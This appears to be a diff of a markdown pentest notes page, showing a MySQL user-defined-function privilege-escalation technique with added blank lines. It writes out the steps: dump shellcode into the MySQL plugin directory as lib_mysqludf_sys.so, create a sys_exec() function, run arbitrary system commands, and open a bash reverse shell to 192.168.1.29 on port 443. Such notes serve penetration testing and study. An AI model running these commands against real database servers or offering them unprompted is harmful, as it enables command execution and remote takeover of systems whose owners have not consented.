@@ -35,15 +35,19 @@ First thing's first. Here's the shellcode we need for **lib_mysqludf_sys.so**.
 Log into mysql and run the following commands:
 
 This command loads the shellcode into a file called **lib_mysqludf_sys.so** within the plugins directory for mysql:
+
 ```select binary <insert-shellcode-here> into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';```
 
 This command creates the **sys_exec()** function from the file we just created:
+
 ```create function sys_exec returns integer soname 'lib_mysqludf_sys.so';```
 
 Now you can run any system command with the following:
+
 ```select sys_exec('your-command-here');```
 
 You could spawn a shell with something like this:
+
 ```select sys_exec('/bin/bash -c \'bash -i >& /dev/tcp/"192.168.1.29"/443 0>&1\'');```
 
 ### ExploitDB:
